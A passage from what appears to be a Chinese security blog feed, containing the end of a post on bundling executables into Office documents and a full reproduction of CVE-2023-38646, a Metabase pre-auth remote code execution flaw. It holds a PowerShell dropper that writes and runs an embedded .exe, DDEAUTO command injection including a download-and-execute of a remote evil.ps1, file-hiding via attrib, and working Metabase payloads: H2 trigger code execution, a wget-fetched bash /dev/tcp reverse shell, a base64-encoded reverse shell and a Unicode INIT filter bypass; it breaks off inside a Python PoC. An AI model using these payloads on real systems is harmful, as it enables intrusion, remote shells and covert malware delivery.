class="string">&#x27;%temp%\\tmp&#x27;</span> + (<span class="built_in">Get-Random</span>) + <span class="string">&#x27;.exe&#x27;</span>;<span class="built_in">sc</span> <span class="variable">$path</span> ([<span class="built_in">byte</span>[]](<span class="variable">$file</span> | <span class="built_in">select</span> <span class="literal">-Skip</span> <span class="number">008241</span>)) <span class="literal">-Encoding</span> Byte; &amp;<span class="variable">$path</span>;<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>存在问题：遍历时间很长而且遍历到很多受保护的文件夹的时候会导致程序终止，稳定性很差</p><h3 id="office-DDE"><a href="#office-DDE" class="headerlink" title="office DDE"></a>office DDE</h3><p><strong>参考：</strong></p><p><a href="https://www.anquanke.com/post/id/87078">Office DDE多种利用方式</a></p><p><a href="https://www.cnblogs.com/17bdw/p/8546380.html">Office DDE漏洞学习笔记</a></p><p>本来考虑使用宏病毒将doc文档释放到指定目录并隐藏，就可以通过硬编码文件路径的方式在任意位置释放并执行捆绑文件，但是发现<code>rtf</code>格式禁止使用宏。所以决定使用<code>DDE</code>注入命令(通过这种方式打开的cmd会默认在文档文件所在的目录)实现复制捆绑文件到指定目录并植入<code>poc</code>代码中的<code>rtf</code>部分</p><h4 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 进入文档文件: ctrl + F9，在显示的大括号中输入以下内容</span><br><span class="line">DDEAUTO c:\\windows\\system32\\<span class="built_in">cmd</span>.exe &quot;/k <span class="built_in">copy</span> <span class="number">11882</span>.doc C:\\Users\\DELL\\AppData\\Local\\Temp&quot;</span><br></pre></td></tr></table></figure><h4 id="修改弹窗"><a href="#修改弹窗" class="headerlink" title="修改弹窗"></a>修改弹窗</h4><p>参考的命令是这样的</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDEAUTO &quot;C:\Programs\Microsoft\Office\MSWord\..\..\..\..\windows\system32\WindowsPowerShell\v1.<span class="number">0</span>\powershell.exe -NoP -sta -NonI -W Hidden IEX (New-Object System.<span class="built_in">Net</span>.WebClient).DownloadString(&#x27;http://willgenovese.com/hax/evil.ps1&#x27;); # &quot; &quot;Microsoft Document Security Add-On&quot;</span><br></pre></td></tr></table></figure><p>但是用起来很多问题，所以自己研究了一下匹配规则重新写了一个：</p><ul><li>将构造好的<code>cd</code>命令放最前面，<code>cd</code>命令可自行更改，需要保证字符个数不变</li><li><p>例如下面的示例：<code>#</code>和<code>Office</code>总字符个数是28，如果你想把<code>Office</code>改成其他的显示，比Office长的就需要减少<code>#</code>，短的就增加<code>#</code></p></li><li><p>没太说明白，多尝试几次就明白我的意思了，后续命令用<code>&amp;</code>连接即可</p></li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDEAUTO C:\\Program_Files(x86)\\Microsoft_Office\\Office12\\Library\\..\\..\\..\\..\\windows\\system32\\<span class="built_in">cmd</span>.exe &quot;/c <span class="built_in">cd</span> C:\\######################\\Office &amp; <span class="built_in">copy</span> <span class="number">11882</span>.doc C:\\Users\\Dell&quot; &quot;Microsoft Document Security Add On&quot;</span><br></pre></td></tr></table></figure><p><strong>关于直接将DDE植入到rtf的二进制格式还没有实现</strong></p><h3 id="隐藏文件"><a href="#隐藏文件" class="headerlink" title="隐藏文件"></a>隐藏文件</h3><p>将捆绑文件释放到指定目录并隐藏，即使设置了显示隐藏文件也无法看到通过这种方式隐藏的文件，除非设置显示受保护的系统隐藏文件 (文件夹-&gt;<code>...</code>-&gt;选项-&gt;查看-&gt;隐藏受保护的操作系统文件)，但是会弹窗警告，说的还挺严重的，可以唬唬普通用户</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 隐藏</span><br><span class="line"><span class="built_in">attrib</span> 文件名(引号可省) +s +h</span><br><span class="line"># 恢复</span><br><span class="line"><span class="built_in">attrib</span> 文件名(引号可省) -s -h</span><br><span class="line"></span><br><span class="line"># 参数解释：</span><br><span class="line"># <span class="built_in">attrib</span>: 修改文件属性</span><br><span class="line"># +s: 将文件设置为系统文件</span><br><span class="line"># +h: 将文件设置为隐藏文件</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 捆绑 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> 捆绑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2023-38646——Metabase远程代码执行</title>
      <link href="/post/9c009a02.html"/>
      <url>/post/9c009a02.html</url>
      
        <content type="html"><![CDATA[<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul><li>Metabase open source 0.46 &lt; 0.46.6.1</li><li>Metabase Enterprise 1.46 &lt; 1.46.6.1</li><li>Metabase open source 0.45 &lt; v0.45.4.1</li><li>Metabase Enterprise 1.45 &lt; 1.45.4.1</li><li>Metabase open source 0.44 &lt; 0.44.7.1</li><li>Metabase Enterprise 1.44 &lt; 1.44.7.1</li><li>Metabase open source 0.43 &lt; 0.43.7.2</li><li>Metabase Enterprise 1.43 &lt; 1.43.7.2</li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>参考链接：</strong></p><p><a href="https://blog.csdn.net/qq_41904294/article/details/131990310">Metabase RCE漏洞复现</a></p><p><a href="https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/">Pre-Auth RCE in Metabase(CVE-2023-38646)</a></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 启用靶机docker环境</span><br><span class="line">docker run -d -p <span class="number">3000</span>:<span class="number">3000</span> --name metabase metabase/metabase:v0.<span class="number">46</span>.<span class="number">6</span></span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 命令行窗口进入容器后台</span><br><span class="line">docker exec -it CONTAINER_ID bash</span><br></pre></td></tr></table></figure><p>浏览器访问<code>http://localhost:3000</code>或<code>http://127.0.0.1:3000</code>可以打开靶机界面。本实验不需要对靶机进行任何特殊处理，不过也可以自己创建一个账户看看</p><h3 id="获取setup-token"><a href="#获取setup-token" class="headerlink" title="获取setup-token"></a>获取setup-token</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /api/session/properties HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:3000</span><br><span class="line">Accept: application/json</span><br><span class="line">Accept-Language: en-US, en; q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://127.0.0.1:3000</span><br></pre></td></tr></table></figure><details class="folding-tag" ><summary> 将上述Get请求发送给目标url </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/08/04/pPkPmkQ.png" alt="image-20230803072422737"></p>              </div>            </details><details class="folding-tag" ><summary> 响应数据 </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/08/04/pPkPZTg.png" alt="image-20230803072522956"></p>              </div>            </details><h3 id="Post请求触发RCE"><a href="#Post请求触发RCE" class="headerlink" title="Post请求触发RCE"></a>Post请求触发RCE</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST /api/setup/validate HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:3000</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;token&quot;: &quot;141c5a35-3b1d-4c1b-8eca-0591111fa08c&quot;,</span><br><span class="line">    &quot;details&quot;:</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;is_on_demand&quot;: false,</span><br><span class="line">        &quot;is_full_sync&quot;: false,</span><br><span class="line">        &quot;is_sample&quot;: false,</span><br><span class="line">        &quot;cache_ttl&quot;: null,</span><br><span class="line">        &quot;refingerprint&quot;: false,</span><br><span class="line">        &quot;auto_run_queries&quot;: true,</span><br><span class="line">        &quot;schedules&quot;:</span><br><span class="line">        &#123;&#125;,</span><br><span class="line">        &quot;details&quot;:</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;db&quot;: &quot;zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec(&#x27;touch /tmp/999&#x27;)\n$$--=x&quot;,</span><br><span class="line">            &quot;advanced-options&quot;: false,</span><br><span class="line">            &quot;ssl&quot;: true</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;name&quot;: &quot;1&quot;,</span><br><span class="line">        &quot;engine&quot;: &quot;h2&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><details class="folding-tag" ><summary> 响应截图 </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/08/04/pPkPV0S.png" alt="image-20230803072721681"></p>              </div>            </details><details class="folding-tag" ><summary> 命令执行成功 </summary>              <div class='content'>              <p><img src="https://img.gejiba.com/images/9eeb69f6e664ce26b9338ede2b32a26f.png" alt="image-20230804004814753"></p>              </div>            </details><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>注：<code>192.168.21.128</code>是我的kali也就是攻击机ip</p><p><strong>shell脚本</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!/bin/sh</span><br><span class="line">bash -c <span class="string">&#x27;exec bash -i &gt;&amp; /dev/tcp/192.168.21.128/6666 0&gt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure><p>启用<code>http</code>服务用于靶机下载<code>shell</code>脚本，注意<code>0.0.0.0</code>在真正使用的时候应该替换为kali即攻击机ip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p><strong>靶机下载shell脚本</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> /api/setup/validate <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">3000</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: application/json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;token&quot;</span>: <span class="string">&quot;141c5a35-3b1d-4c1b-8eca-0591111fa08c&quot;</span>,</span><br><span class="line">    <span class="string">&quot;details&quot;</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;is_on_demand&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;is_full_sync&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;is_sample&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;cache_ttl&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&quot;refingerprint&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;auto_run_queries&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="string">&quot;schedules&quot;</span>:</span><br><span class="line">        &#123;&#125;,</span><br><span class="line">        <span class="string">&quot;details&quot;</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;db&quot;</span>: <span class="string">&quot;zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec(&#x27;wget http://192.168.21.128:80/1.sh -O /tmp/shell.sh&#x27;)\n$$--=x&quot;</span>,</span><br><span class="line">            <span class="string">&quot;advanced-options&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&quot;ssl&quot;</span>: <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;engine&quot;</span>: <span class="string">&quot;h2&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里只用下载一次就够了，我在本机上试了几次所以有多条下载记录。<code>metabase</code>是搭在本地的，所以下载使用的<code>ip</code>和本机是同样的</p><p><img src="https://s1.ax1x.com/2023/08/04/pPkPufs.png" alt="image-20230803072956456"></p><details class="folding-tag" ><summary> 下载成功 </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/08/04/pPkPMpn.png" alt="image-20230803073021405"></p>              </div>            </details><p><strong>执行shell脚本</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST /api/setup/validate HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:3000</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;token&quot;: &quot;141c5a35-3b1d-4c1b-8eca-0591111fa08c&quot;,</span><br><span class="line">    &quot;details&quot;:</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;is_on_demand&quot;: false,</span><br><span class="line">        &quot;is_full_sync&quot;: false,</span><br><span class="line">        &quot;is_sample&quot;: false,</span><br><span class="line">        &quot;cache_ttl&quot;: null,</span><br><span class="line">        &quot;refingerprint&quot;: false,</span><br><span class="line">        &quot;auto_run_queries&quot;: true,</span><br><span class="line">        &quot;schedules&quot;:</span><br><span class="line">        &#123;&#125;,</span><br><span class="line">        &quot;details&quot;:</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;db&quot;: &quot;zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec(&#x27;/bin/bash /tmp/shell.sh&#x27;)\n$$--=x&quot;,</span><br><span class="line">            &quot;advanced-options&quot;: false,</span><br><span class="line">            &quot;ssl&quot;: true</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;name&quot;: &quot;1&quot;,</span><br><span class="line">        &quot;engine&quot;: &quot;h2&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>监听<code>6666</code>端口，获取靶机反弹<code>shell</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2023/08/04/pPkPl60.png" alt="image-20230803073104337"></p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><h3 id="setup-token获取"><a href="#setup-token获取" class="headerlink" title="setup-token获取"></a>setup-token获取</h3><p><strong>参考：</strong></p><p><a href="https://rce.moe/2023/07/28/Metabase-CVE-2023-38646/">Metabase 远程代码执行漏洞分析</a></p><p><a href="https://zhuanlan.zhihu.com/p/646597739">H2 JDBC 深入利用</a></p><p>调用<code>/api/setup/validate</code>通过<code>api.database/test-database-connection</code>来处理输入的参数完成对数据库的校验。</p><details class="folding-tag" ><summary> /api/setup/validate </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/08/04/pPkPQlq.png" alt="image-20230803181311102"></p>              </div>            </details><p><code>setup</code>在安装时会校验<code>setup-token</code>参数是否正确，来判断是否要进行下步的数据库连接</p><details class="folding-tag" ><summary> 校验 </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/08/04/pPkP1XV.png" alt="image-20230803182005002"></p>              </div>            </details><p><code>setup-token</code>在进行生成的时候被默认设置为了<code>public</code>权限，所以可以通过<code>/api/session/properties</code>来读取</p><details class="folding-tag" ><summary> 获取setup-token </summary>              <div class='content'>              <p><img src="https://img.gejiba.com/images/5daeddcfbaf2466fef0d1ce936e398a2.png" alt="image-20230803182207817"></p>              </div>            </details><h3 id="setup-token利用"><a href="#setup-token利用" class="headerlink" title="setup-token利用"></a>setup-token利用</h3><h4 id="zip-URI方法"><a href="#zip-URI方法" class="headerlink" title="zip URI方法"></a>zip URI方法</h4><p><code>H2</code>在解析 <code>init</code>参数时对<code>CREATE TRIGGER</code>会由<code>loadFromSource</code>做特殊处理，根据执行内容的开头来判断是否为需要通过<code>javascript</code>引擎执行。如果以<code>javascript</code>开头就会通过<code>javascript</code>引擎进行编译然后进行执行。</p><p><img src="https://img.gejiba.com/images/1c040ebe97a83242462133e226d62dac.png" alt="image-20230803183554600"></p><p>我们就可以通过<code>javascript</code>引擎来实现代码执行，不过该方式在<code>JDK 15</code>之后移除了默认的解析，但是<code>metabase</code>在项目中使用到了<code>js</code>引擎技术。</p><p><img src="https://img.gejiba.com/images/dc38a1de6d61b84af52ee81219e4308f.png" alt="image-20230803183019748"></p><p><code>YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvOTk5OCAwPiYx</code>需要使用自己的IP和Port重新编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST /api/setup/validate HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 812</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;token&quot;: &quot;5491c003-41c2-482d-bab4-6e174aa1738c&quot;,</span><br><span class="line">    &quot;details&quot;:</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;is_on_demand&quot;: false,</span><br><span class="line">        &quot;is_full_sync&quot;: false,</span><br><span class="line">        &quot;is_sample&quot;: false,</span><br><span class="line">        &quot;cache_ttl&quot;: null,</span><br><span class="line">        &quot;refingerprint&quot;: false,</span><br><span class="line">        &quot;auto_run_queries&quot;: true,</span><br><span class="line">        &quot;schedules&quot;:</span><br><span class="line">        &#123;&#125;,</span><br><span class="line">        &quot;details&quot;:</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;db&quot;: &quot;zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec(&#x27;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvOTk5OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)\n$$--=x&quot;,</span><br><span class="line">            &quot;advanced-options&quot;: false,</span><br><span class="line">            &quot;ssl&quot;: true</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;name&quot;: &quot;an-sec-research-team&quot;,</span><br><span class="line">        &quot;engine&quot;: &quot;h2&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="H2限制绕过"><a href="#H2限制绕过" class="headerlink" title="H2限制绕过"></a>H2限制绕过</h4><p><strong>转载</strong>：<a href="https://rce.moe/2023/07/28/Metabase-CVE-2023-38646/">Metabase 远程代码执行漏洞分析</a></p><p>分析源码发现<code>H2</code>连接时会将<code>INIT</code>参数移除</p><p><img src="https://img.gejiba.com/images/f8c2ccee701e82a069e2ca76301e17b9.png" alt="image-20230803185430236"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(defn- connection-string-set-safe-options</span><br><span class="line">  &quot;Add Metabase Security Settings™ to this `connection-string` (i.e. try to keep shady users from writing nasty SQL).&quot;</span><br><span class="line">  [connection-string]</span><br><span class="line">  &#123;:pre [(string? connection-string)]&#125;</span><br><span class="line">  (let [[file options] (connection-string-&gt;file+options connection-string)]</span><br><span class="line">    (file+options-&gt;connection-string file (merge</span><br><span class="line">                                           (-&gt;&gt; options</span><br><span class="line">;; Remove INIT=... from options for security reasons (Metaboat #165)</span><br><span class="line">;; http://h2database.com/html/features.html#execute_sql_on_connection</span><br><span class="line">                                                (remove (fn [[k _]] (= (u/lower-case-en k) &quot;init&quot;)))</span><br><span class="line">                                                (into &#123;&#125;))</span><br><span class="line">                                           &#123;&quot;IFEXISTS&quot; &quot;TRUE&quot;&#125;))))</span><br></pre></td></tr></table></figure><p><code>connection-string-set-safe-options</code>使用了<code>lower-case-en</code>将参数名转换为小写字母之后与<code>init</code>匹配进行校验.<br><code>H2</code>则是将参数名转换为大写</p><p><img src="https://img.gejiba.com/images/0a70ff0f814f367f18d5f567da72e30f.png" alt="image-20230803193502835"></p><p>这里刚好可以使用 拉丁字母<code>ı</code>替换<code>INIT</code>中的<code>I</code>，<code>ıNIT</code>在转成大写时为<code>INIT</code>但是<code>ıNIT</code>转成小写后为<code>ınit</code>中的<code>ı</code>没有被转换，绕过限制</p><p><strong>构造post请求</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST /api/setup/validate HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:3000</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;token&quot;: &quot;141c5a35-3b1d-4c1b-8eca-0591111fa08c&quot;,</span><br><span class="line">    &quot;details&quot;:</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;is_on_demand&quot;: false,</span><br><span class="line">        &quot;is_full_sync&quot;: false,</span><br><span class="line">        &quot;is_sample&quot;: false,</span><br><span class="line">        &quot;cache_ttl&quot;: null,</span><br><span class="line">        &quot;refingerprint&quot;: false,</span><br><span class="line">        &quot;auto_run_queries&quot;: true,</span><br><span class="line">        &quot;schedules&quot;:</span><br><span class="line">        &#123;&#125;,</span><br><span class="line">        &quot;details&quot;:</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;db&quot;: &quot;file:/metabase.db/metabase.db;ınit=CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec(&#x27;touch /tmp/abc&#x27;)\n$$&quot;,</span><br><span class="line">            &quot;advanced-options&quot;: true&#125;,</span><br><span class="line">        &quot;name&quot;: &quot;1&quot;,</span><br><span class="line">        &quot;engine&quot;: &quot;h2&quot;,</span><br><span class="line">        &quot;database&quot;: &#123;&quot;db&quot;: &quot;file:/metabase.db/metabase.db;ınit=CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec(&#x27;bash -c touch /tmp/abc&#x27;)  $$&quot;, </span><br><span class="line">        &quot;advanced-options&quot;: true,</span><br><span class="line">        &quot;ssl&quot;: false&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><details class="folding-tag" ><summary> RCE成功 </summary>              <div class='content'>              <p><img src="https://img.gejiba.com/images/6df926774864fadbc1249fea1f80f905.png" alt="image-20230803191113959"></p><p><img src="https://img.gejiba.com/images/8e5b72bcd2d8f35dd018b5ceae471ad9.png" alt="成功RCE"></p>              </div>            </details><h4 id="mem方法"><a href="#mem方法" class="headerlink" title="mem方法"></a>mem方法</h4><p><strong>参考：</strong><a href="https://github.com/0xrobiul/CVE-2023-38646/blob/main/POC.png">0xrobiul / CVE-2023-38646</a></p><p>这个我没有做过，感兴趣可以自行尝试，这个方法需要使用<code>Burpsuite</code>的<code>collaborator</code>，专业版Burpsuite自带这个功能，下载地址：<a href="https://blog.csdn.net/john_david_/article/details/87273568">Burpsuite_Pro</a></p><p><strong>poc代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> colorama <span class="keyword">import</span> Fore, Style</span><br><span class="line">Gcyan = Fore.YELLOW + Style.BRIGHT</span><br><span class="line">Cyan = Fore.CYAN + Style.BRIGHT</span><br><span class="line">STOP = Style.RESET_ALL</span><br><span class="line">logo = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   _____   _____   ___ __ ___ ____   ____ ___   __ _ _   __ </span></span><br><span class="line"><span class="string">  / __\ \ / / __|_|_  )  \_  )__ /__|__ /( _ ) / /| | | / / </span></span><br><span class="line"><span class="string"> | (__ \ V /| _|___/ / () / / |_ \___|_ \/ _ \/ _ \_  _/ _ \\</span></span><br><span class="line"><span class="string">  \___| \_/ |___| /___\__/___|___/  |___/\___/\___/ |_|\___/</span></span><br><span class="line"><span class="string">                                                            </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(Gcyan + logo + STOP)</span><br><span class="line"><span class="built_in">print</span>(Cyan + <span class="string">&quot;The PoC Finder!!&quot;</span> + STOP + Gcyan + <span class="string">&quot;   By: 0xRobiul\n&quot;</span> + STOP)</span><br><span 